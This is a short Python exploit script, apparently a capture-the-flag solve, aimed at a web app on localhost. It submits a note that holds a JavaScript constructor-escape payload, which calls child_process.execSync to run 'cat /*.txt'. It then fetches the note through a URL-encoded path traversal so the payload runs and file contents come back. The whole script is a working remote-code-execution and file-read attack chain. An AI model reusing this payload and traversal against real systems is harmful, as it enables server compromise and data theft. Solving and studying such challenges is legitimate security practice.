import httpx
import html
URL = "http://localhost:8000"


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)


class API(BaseAPI):
    def loadFile(s, path):
        return s.c.get("/"+path)

    def sendFile(s, data):
        return s.c.post("/note", data={"note": data})


if __name__ == "__main__":
    api = API()
    res = api.sendFile("""p={}.constructor.constructor("return global.process.mainModule.require('child_process').execSync('cat /*.txt').toString()")()""")
    noteid = res.headers.get("location").split("/")[-1]
    res = api.loadFile("..%2fstorage%2f"+noteid)
    print(html.unescape(res.text))
